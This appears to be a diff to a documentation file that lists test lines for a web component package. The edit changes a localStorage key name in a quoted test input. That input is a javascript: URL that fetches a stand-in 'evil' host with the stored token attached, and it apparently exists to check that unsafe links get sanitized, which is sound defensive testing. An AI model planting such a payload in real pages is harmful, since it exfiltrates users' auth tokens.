@@ -11,7 +11,7 @@ Component package providing implementation for `apps/suites/vitruvian-tabs/web/_
 
 ## Side Effects
 - [SpaceView.test.tsx:49]: `it("renders a safe http(s) resource as a real link", () => {`
-- [SpaceView.test.tsx:77]: `url: "javascript:fetch('//evil/'+localStorage.vitruvian-tabs_token)",`
+- [SpaceView.test.tsx:77]: `url: "javascript:fetch('//evil/'+localStorage.vitruvian_tabs_token)",`
 - [safe-href.test.ts:26]: `it("allows absolute http and https URLs", () => {`
 - [safe-href.test.ts:30]: `expect(safeHref("http://example.com")).toBe("http://example.com");`
 - [sharing.test.ts:32]: `global.fetch = mockFetch as unknown as typeof fetch;`
